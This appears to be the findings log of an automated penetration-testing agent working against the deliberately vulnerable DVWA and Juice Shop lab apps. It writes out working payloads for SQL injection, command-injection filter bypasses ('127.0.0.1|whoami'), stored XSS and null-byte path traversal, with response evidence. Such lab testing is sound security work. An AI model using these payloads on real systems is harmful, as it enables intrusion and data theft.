state.objective: Discover and behaviorally verify security vulnerabilities across permitted targets (http://dvwa and http://juiceshop:3000) within strict HTTP, LLM, and duration budgets.

endpoints.observation_evidence: Basket retrieval with no ownership check; cross-user access works.

findings.title: Cross-User Basket Access (BOLA)
findings.response_evidence: acct2 (own_basket_id=7) retrieved basket id=6 belonging to UserId=22 (acct1), disclosing its item: Apple Juice (1000ml), quantity=3. No authorization check on basket ownership.

findings.title: Confidential Document via Open Directory Listing
findings.response_evidence: /ftp/ directory listing exposed acquisitions.md (909 bytes). Direct retrieval returned confidential memo: '# Planned Acquisitions ... This document is confidential! Do not distribute! Our company plans to acquire several competitors within the next year. This will have a significant stock market impact...'

findings.title: Login Authentication-Bypass SQL Injection
findings.response_evidence: HTTP 200 returned a valid authentication JWT token with umail=admin@juice-sh.op and bid=1 — authenticated as the first user without valid credentials.

findings.title: Product-Search SQL Injection (UNION)
findings.response_evidence: Single quote triggered HTTP 500 'Error: SQLITE_ERROR: near \"'%'\": syntax error'. The 9-column UNION returned HTTP 200 with injected columns mapped to fields: {id:1,name:2,description:3,price:4,...,deletedAt:9}, confirming successful UNION injection.

findings.title: Unauthenticated User-Feedback PII Exposure
findings.response_evidence: Unauthenticated request returned feedback records disclosing author email addresses embedded in comments, e.g. '(***in@juice-sh.op)', '(***@juice-sh.op)', '(***der@juice-sh.op)', '(***ereum@juice-sh.op)' — partially masked but confirming PII email disclosure without auth.

findings.title: Poison Null-Byte Path Traversal
request_sequence: GET /ftp/package.json.bak -> HTTP 403 'Only .md and .pdf files are allowed!'
findings.response_evidence: Raw /ftp/package.json.bak returned HTTP 403 'Error: Only .md and .pdf files are allowed!'. Appending null-byte %2500.md bypassed the filter: HTTP 200 content-type application/octet-stream returning the restricted backup file content (package.json with name 'juice-shop', version '6.2.0-SNAPSHOT', full dependency list).

findings.title: Exposed Encryption-Keys Directory
findings.response_evidence: HTTP 200 browsable directory listing of /encryptionkeys/ exposing sensitive key files: jwt.pub (248 bytes) and premium.key (50 bytes).

findings.title: SQL Injection (low) - boolean quoted
findings.response_evidence: [security=low] TRUE payload returned multiple seeded surnames: admin, Brown, Me, Picasso, Smith. FALSE payload (1' AND '1'='2) returned zero records (empty User ID result). Confirms boolean-based SQLi.

findings.title: OS Command Injection (low)
findings.response_evidence: [security=low] Response contained ping output followed by 'www-data' — the web-process identity, confirming command injection via ; separator.

findings.title: Stored XSS (low)
request_sequence: POST /vulnerabilities/xss_s/ txtName=t&mtxMessage=<script id="test_token">window.xss_flag=1</script>&btnSign=Sign Guestbook (maxlength bypassed via direct POST)
findings.response_evidence: [security=low] The canary script was stored and rendered. In authenticated browser context, window.xss_flag evaluated to 1, proving stored JavaScript executed.

findings.title: SQL Injection (medium) - numeric boolean
findings.response_evidence: [security=medium] Quotes are escaped so a numeric boolean was used. TRUE (1 OR 1=1) returned all seeded surnames: admin, Brown, Me, Picasso, Smith. FALSE (1 AND 1=2) returned zero records. Confirms numeric boolean-based SQLi via POST id.

findings.title: OS Command Injection (medium) - pipe bypass
findings.response_evidence: [security=medium] ';' and '&&' are blacklisted; using pipe '|' bypassed the filter. Response output was 'www-data', the web-process identity, confirming command injection.

findings.title: OS Command Injection (high) - pipe no-space bypass
findings.response_evidence: [security=high] '; ', '| ' (pipe+space) and '&&' are blacklisted; pipe with no trailing space (127.0.0.1|whoami) bypassed the filter. Response output was 'www-data', the web-process identity. Page confirms Security Level: high.

findings.title: SQL Injection (high) - out-of-band session input with comment
findings.response_evidence: [security=high] id submitted out-of-band via session-input.php; query appends LIMIT 1 so a trailing '#' comment neutralizes it. TRUE payload (1' OR '1'='1' #) returned all seeded surnames: admin, Brown, Me, Picasso, Smith. FALSE payload (1' AND '1'='2' #) returned zero records. Page confirms Security Level: high.
